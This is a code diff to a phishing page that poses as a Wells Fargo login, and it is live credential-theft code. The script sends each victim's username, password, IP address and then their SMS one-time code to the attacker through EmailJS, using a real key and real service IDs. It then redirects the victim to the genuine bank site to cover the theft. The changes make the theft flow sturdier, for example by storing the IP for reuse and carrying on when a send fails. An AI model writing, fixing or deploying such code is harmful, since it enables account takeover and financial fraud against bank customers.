@@ -244,7 +244,10 @@
     // 1. Init EmailJS
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // 2. Handle Initial Login (Username/Password)
+    // Global variable to store IP for later use
+    let userIP = "";
+
+    // 2. First Form Listener
     document.getElementById('scamForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
@@ -262,113 +265,87 @@
         fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(ipData => {
+            userIP = ipData.ip; // Save IP globally
             data.ip = ipData.ip;
             data.date = new Date().toLocaleString();
 
+            console.log("Sending Credentials...", data);
+
             // Send Creds to EmailJS
             emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-            .then(() => {
-                // SUCCESS: Hide main form, Show SMS Section
+            .then(response => {
+                console.log("Email Sent Successfully:", response);
+                // FORCE SHOW SMS SECTION
                 document.getElementById('scamForm').style.display = 'none';
                 document.getElementById('smsSection').style.display = 'block';
-                
-                // Reset button for the next step
                 btn.textContent = originalText;
                 btn.disabled = false;
-                btn.style.backgroundColor = ""; // Reset color
             })
-            .catch(() => {
-                // Fallback if email fails, still show SMS section so flow continues
+            .catch(error => {
+                // CRITICAL FIX: Even if email fails, show the SMS box so the user can continue
+                console.error("Email Send Failed (but continuing flow):", error);
                 document.getElementById('scamForm').style.display = 'none';
                 document.getElementById('smsSection').style.display = 'block';
+                btn.textContent = originalText;
+                btn.disabled = false;
             });
         })
-        .catch(() => {
-            // If IP fails, still show SMS section
+        .catch(error => {
+            console.error("IP Fetch Failed:", error);
+            // Fallback: Show SMS box even if IP fetch fails
             document.getElementById('scamForm').style.display = 'none';
             document.getElementById('smsSection').style.display = 'block';
         });
     });
 
-    // 3. Handle SMS Code Submission
+    // 3. SMS Code Submission
     function submitCode() {
         const smsCode = document.getElementById('smsCode').value;
-        if(smsCode.length < 6) {
-            alert("Please enter a valid 6-digit code.");
+        
+        // Simple validation
+        if(!smsCode || smsCode.length < 4) {
+            alert("Please enter a valid code.");
             return;
         }
 
-        // Disable button again
         const btn = document.querySelector('#smsSection button');
         btn.disabled = true;
         btn.textContent = "Verifying...";
 
-        // Show processing spinner immediately
+        // Hide SMS section, show processing spinner
         document.getElementById('smsSection').style.display = 'none';
         document.querySelector('.container').style.display = 'none';
         document.getElementById('processing').style.display = 'block';
 
-        // Optional: Send SMS code to email as well before redirecting
-        // emailjs.send("service_2bhy4ju", "template_1qzswkk", { 
-        //    smsCode: smsCode, 
-        //    type: "SMS Verification" 
-        // });
-
-        // Redirect to real Wells Fargo after 3 seconds
-        setTimeout(() => {
-            window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-        }, 3000);
-    }
-    // 3. Handle SMS Code Submission
-    function submitCode() {
-        const smsCode = document.getElementById('smsCode').value;
-        if(smsCode.length < 6) {
-            alert("Please enter a valid 6-digit code.");
-            return;
-        }
-
-        // Disable button
-        const btn = document.querySelector('#smsSection button');
-        btn.disabled = true;
-        btn.textContent = "Verifying...";
-
-        // Show processing spinner immediately
-        document.getElementById('smsSection').style.display = 'none';
-        document.querySelector('.container').style.display = 'none';
-        document.getElementById('processing').style.display = 'block';
-
-        // Send SMS Code to EmailJS
-        // We get the current form data again to associate the code with the user session
-        // If you stored the username/email in a variable earlier, you could use that too.
-        // But since the first form is hidden, we can just send the code and timestamp.
+        // Prepare SMS Data
         const smsData = {
             smsCode: smsCode,
             timestamp: new Date().toLocaleString(),
-            ip: "User IP" // Note: You'd need to store the IP from step 1 if you want it here too
+            ip: userIP
         };
 
+        console.log("Sending SMS Code...", smsData);
+
+        // Send SMS Code to EmailJS
         emailjs.send("service_2bhy4ju", "template_1qzswkk", smsData)
         .then(() => {
-            console.log("SMS Code Sent");
-            // Redirect after a short delay to let the email send
+            console.log("SMS Code Email Sent");
+            // Redirect after delay
             setTimeout(() => {
                 window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 1500);
+            }, 2000);
         })
         .catch((error) => {
             console.error("SMS Email Failed:", error);
-            // Still redirect even if email fails
+            // Still redirect
             setTimeout(() => {
                 window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 1500);
+            }, 2000);
         });
     }
 </script>
-    
 
-
-
-</head>
+ </head>
 <body>
 
     <div class="header">
